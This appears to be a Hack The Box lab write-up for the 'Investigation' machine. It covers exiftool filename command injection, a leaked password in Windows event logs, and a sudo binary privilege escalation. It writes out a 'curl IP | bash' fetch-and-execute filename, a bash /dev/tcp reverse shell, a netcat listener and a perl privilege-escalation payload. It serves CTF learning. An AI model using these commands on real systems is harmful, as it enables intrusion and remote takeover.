---
title: "Hackthebox Investigation"
date: 2023-01-25T14:44:57+01:00
draft: false
---

On Investigation we exploit an exiftool vulnerability from file upload that allow command execution and to gain a reverse shell.
Next we get credentials for one user from a mail text message. Finally, for root we have to do a little bit
of binary exploitation using ghidra.

<!--more-->

## Nmap

As usual we start we some recon :

```
nmap 10.129.139.235
Nmap scan report for 10.129.139.235
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
```

## HTTP:80

![image text](/investigation_htb_web.png)

Jumping on the website we see a free service which allow us to upload image file (png/jpg) :

![image text](/investigation_htb_upload.png)

The output allows us to view exiftool's version number.

![image text](/investigation_htb_exif.png)

The version is 12.39 and it seems that it's vulnerable to command injection through a crafted filename.
If the filename passed to exiftool ends with a pipe character `|` and exists on the filesystem,
then the file will be treated as a pipe and executed as an OS command.

The proof of concept can be found **[here](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429)**.
Now all we have to do is to rename our image file with one linux command add the pipe at the end :

```
mv image.png 'curl IP | bash |'
```

Next we need to create and index.html file, put a bash reverse shell in it and host our file using python :

```
cat index.html
bash -i >& /dev/tcp/IP/6666 0>&1
```

```
python3 -m http.server 80
```

Setup a netcat listener and let's go :

```bash
nc -lnvp 6666
Listening on 0.0.0.0 6666
Connection received on 10.129.139.235
www-data@investigation:~/uploads/1674415004$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## **Shell as smorton**

There is a Windows Event Logs message file owned by smorton in `usr/local/investigation`.
Transfer the mail on our machine and open it with outlook :

![image text](/mail_investigation.png)

We can see that there is a zip file in attachment. After unziping it, I got an EVTX file, a Windows XML EventLog file.
To analyze the file I choose : **[EVTX](https://github.com/omerbenamram/evtx)**.

```bash
┌──(kali㉿kali)-[~/Documents/htb/box/investigation]
└─$ ./evtx_dump-v0.8.0-x86_64-unknown-linux-gnu -f output_evtx -o json security.evtx
```

The output contains a lot of rows so lets filter it :

```bash
┌──(kali㉿kali)-[~/Documents/htb/box/investigation]
└─$ grep TargetUserName evtx_ouput | sort -u > sorted.txt

┌──(kali㉿kali)-[~/Documents/htb/box/investigation]
└─$ head -n 11 sorted.txt
      \"TargetUserName\": \"-\",
      \"TargetUserName\": \"aanderson\",
      \"TargetUserName\": \"AAnderson\"
      \"TargetUserName\": \"AAnderson\",
      \"TargetUserName\": \"Administrator\"
      \"TargetUserName\": \"Administrators\"
      \"TargetUserName\": \"AWright\"
      \"TargetUserName\": \"Backup Operators\"
      \"TargetUserName\": \"BMay\"
      \"TargetUserName\": \"DefaultAccount\"
      \"TargetUserName\": \"Def@ultf0r3nz!csPa$$\",
```

I noticed `Def@ultf0r3nz!csPa$$` it seems like a password so let's try it to ssh to smorton user :

![image text](/ssh_investigation.png)

And it works, let's switch to the root part now.

## **Shell as root**

By looking at privileges sudoers we can see a binary called binary :

```bash
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
smorton@investigation:~$

```

With the help of ghidra we can open the binary and open the main function :

![image text](/ghidra_investigation.png)

In one part of the code we can see that verifies that the total of parameters is 3, means that in addition to the binary we need another 2 parameters :

```bash
if (param_1 != 3) {
  puts("Exiting... ");
  exit(0);
}
```

Also elsewhere we can see that compares the uid is equal to 0 (root who runs it), if the condition fails does exactly the same as before

```bash
_Var1 = getuid();
if (_Var1 != 0) {
  puts("Exiting... ")
  exit(0);
}
```

Elsewhere we can see that verifies that the second parameter is `lDnxUysaQn` if the condition is not met also does the same as before :

```bash
iVar2 = strcmp(*(char **)(param_2 + 0x10),"lDnxUysaQn");
if (iVar2 != 0) {
  puts("Exiting... ");
  exit(0);
}
```

If the conditions are met use the curl function to read a file from a web resource that we can specify in the first parameter and save it in the open file :

```bash
puts("Running... ");
__stream = fopen(*(char **)(param_2 + 0x10),"wb");
uVar3 = curl_easy_init();
curl_easy_setopt(uVar3,0x2712,*(undefined8 *)(param_2 + 8));
curl_easy_setopt(uVar3,0x2711,__stream);
curl_easy_setopt(uVar3,0x2d,1);
iVar2 = curl_easy_perform(uVar3);
```

If at this point you follow the stream, you will run the saved web resource file with perl :

```bash
if (iVar2 == 0) {
  iVar2 = snprintf((char *)0x0,0,"%s",*(undefined8 *)(param_2 + 0x10));
  __s = (char *)malloc((long)iVar2 + 1);
  snprintf(__s,(long)iVar2 + 1,"%s",*(undefined8 *)(param_2 + 0x10));
  iVar2 = snprintf((char *)0x0,0,"perl ./%s",__s);
  __s_00 = (char *)malloc((long)iVar2 + 1);
  snprintf(__s_00,(long)iVar2 + 1,"perl ./%s",__s);
  fclose(__stream);
  curl_easy_cleanup(uVar3);
  setuid(0);
  system(__s_00);
  system("rm -f ./lDnxUysaQn");
  return 0;
}
```

To exploit this, we create a perl file that runs 'su' and share it

```bash
cat exploit.pl
exec("su")

sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Finally we run the binary with the arguments we know we need and when we run its launches a bash as root :

```bash
smorton@investigation:~$ sudo binary http://10.10.14.84/exploit.pl lDnxUysaQn
Running...
root@investigation:~# id
uid=0(root) gid=0(root) groups=0(root)
```
